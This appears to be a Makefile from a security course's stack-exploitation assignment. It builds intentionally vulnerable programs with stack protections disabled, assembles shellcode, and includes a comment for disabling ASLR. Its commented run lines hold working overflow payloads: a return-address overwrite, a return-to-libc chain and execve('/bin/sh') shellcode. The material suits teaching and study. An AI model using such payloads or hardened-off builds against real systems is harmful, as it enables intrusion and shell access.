# disable ASLR
#echo 0 > /proc/sys/kernel/randomize_va_space
# for gdb debugging(after entering gdb)
#unset env LINES
#unset env COLUMNS

CC=clang
CFLAGS=-g -O0 -z execstack -fno-stack-protector -w
CFLAGS32=-g -O0 -z execstack -fno-stack-protector -m32 -w
FULLAPTH=/mnt/storage/devel/cryptography/assignment4/code

all:
	$(CC) $(CFLAGS) -o hackthisprogram1_64.out hackthisprogram1.c
	$(CC) $(CFLAGS) -o hackthisprogram1_mod_64.out hackthisprogram1_mod.c
	$(CC) $(CFLAGS32) -o hackthisprogram1_32.out hackthisprogram1.c 
	$(CC) $(CFLAGS32) -o hackthisprogram2_32.out hackthisprogram2.c 

shellcode:
	as --64 shellcode.s -o shellcode.o
	ld shellcode.o -o shellcode.out
	objcopy -j.text -O binary shellcode.out shellcode.bin
	hexdump -v -e '"\\""x" 1/1 "%02x" ""' shellcode.bin

testshellcode:
	$(CC) $(CFLAGS) -o testshellcode.out testshellcode.c

clean:
	rm -f *.out
	rm -f *.o
	rm -f *.bin

# run:
# 	$(FULLPATH)/hackthisprogram1_64.out $(python -c '__import__("sys").stdout.buffer.write(b"A"*12+b"B"*16+b"C"*8+b"\x24\x52\x55\x55\x55\x55\x00\x00")')
#	/mnt/storage/devel/cryptography/assignment4/code/hackthisprogram1_64.out $(python -c '__import__("sys").stdout.buffer.write(b"A"*12+b"B"*16+b"C"*8+b"\x24\x52\x55\x55\x55\x55\x00\x00")')

# 	$(FULLPATH)/hackthisprogram1_32.out $(python -c '__import__("sys").stdout.buffer.write(b"\x41"*16+b"\xf4\x8f\x55\x56"+b"\x18\xcc\xff\xff"+b"\x40\x98\xc4\xf7"+b"\x41"*4+b"\xaa\xaf\xdb\xf7")')
#	/mnt/storage/devel/cryptography/assignment4/code/hackthisprogram1_32.out $(python -c '__import__("sys").stdout.buffer.write(b"\x41"*16+b"\xf4\x8f\x55\x56"+b"\x18\xcc\xff\xff"+b"\x40\x98\xc4\xf7"+b"\x41"*4+b"\xaa\xaf\xdb\xf7")')

#	$(FULLPATH)/hackthisprogram1_mod_64.out $(python -c '__import__("sys").stdout.buffer.write(b"\xeb\x08\x2f\x62\x69\x6e\x2f\x73\x68\xff\x31\xc0\x88\x05\xf7\xff\xff\xff\x48\x8d\x3d\xe9\xff\xff\xff\x50\x57\x48\x89\xe6\x31\xd2\xb0\x3b\x0f\x05"+b"\x41"*36+b"\x50\xd9\xff\xff\xff\x7f\x00\x00")')
#	/mnt/storage/devel/cryptography/assignment4/code/hackthisprogram1_mod_64.out $(python -c '__import__("sys").stdout.buffer.write(b"\xeb\x08\x2f\x62\x69\x6e\x2f\x73\x68\xff\x31\xc0\x88\x05\xf7\xff\xff\xff\x48\x8d\x3d\xe9\xff\xff\xff\x50\x57\x48\x89\xe6\x31\xd2\xb0\x3b\x0f\x05"+b"\x41"*36+b"\x50\xd9\xff\xff\xff\x7f\x00\x00")')
